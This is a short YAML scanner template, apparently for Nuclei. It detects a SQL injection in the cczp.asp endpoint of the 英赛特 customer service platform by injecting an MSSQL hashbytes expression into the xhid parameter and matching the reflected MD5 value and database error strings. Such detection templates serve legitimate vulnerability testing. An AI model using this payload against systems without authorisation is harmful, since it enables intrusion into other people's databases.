id: poc-yaml-yingsaite-icsp-cczp-asp-sqli
info:
  name: 英赛特互联网客户服务平台 cczp.asp SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects a SQL injection vulnerability in 英赛特互联网客户服务平台 at the cczp.asp endpoint.

variables:
  t1: "{{rand_int(1000,10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: GET
    path:
      - "/csccmise/cczp.asp?xhid=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "0x{{t2}}"
          - "SQL"
          - "ODBC"
          - "/csccmise/cczp.asp"
